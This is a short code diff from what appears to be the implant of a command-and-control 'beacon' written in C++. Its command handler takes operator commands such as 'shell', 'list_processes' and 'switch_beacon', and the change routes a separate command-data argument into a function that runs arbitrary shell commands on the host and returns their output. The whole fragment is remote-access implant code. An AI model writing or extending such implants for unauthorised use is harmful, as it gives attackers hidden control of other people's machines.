@@ -76,12 +76,11 @@ std::string getSystemInfo() {
     return ss.str();
 }
 
-std::string command_handler(const std::string& command, const std::string& uuid){
+std::string command_handler(const std::string& command, const std::string& command_data,  const std::string& uuid){
     if (command == "shutdown") {
     } else if (command == "switch_beacon") {
-    } else if (command.rfind("shell", 0) == 0) { // need to check if it starts with shell, limitation of current beacon on server
-        std::string shell_command = command.substr(6); // Get the command after "shell "
-        std::string output = executeShellCommand(shell_command.c_str());
+    } else if (command == "shell") { // need to check if it starts with shell, limitation of current beacon on server
+        std::string output = executeShellCommand(command_data.c_str());
         std::cout << "Shell command output: " << output << std::endl;
         return output;
     } else if (command == "list_processes") {
